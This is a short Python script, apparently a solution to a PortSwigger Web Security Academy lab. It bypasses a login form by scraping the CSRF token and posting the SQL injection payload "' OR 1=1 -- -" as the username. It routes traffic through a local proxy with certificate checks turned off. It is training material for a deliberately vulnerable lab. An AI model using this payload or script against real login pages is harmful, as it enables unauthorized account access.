import requests
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/lab-login-bypass
# db: MySQL
# author: 0xyf


class SQLi2:
    def __init__(self):
        lab_id = "0a40007803a6f60a806d301500a400f5"
        path = "login"
        self.URL = f"https://{lab_id}.web-security-academy.net/{path}"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.get_csrf_token()

    def get_csrf_token(self):
        r = requests.get(self.URL)
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        data = {"username": payload, "password": "dontmatter", "csrf": self.csrf_token}
        requests.post(
            f"{self.URL}",
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(2)
        r = requests.get(self.URL)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def bypass_login(self):
        self.get_csrf_token()
        payload = "' OR 1=1 -- -"
        self.execute_request(payload)
        self.check_solved()


def main():
    SQLi2().bypass_login()


if __name__ == "__main__":
    main()
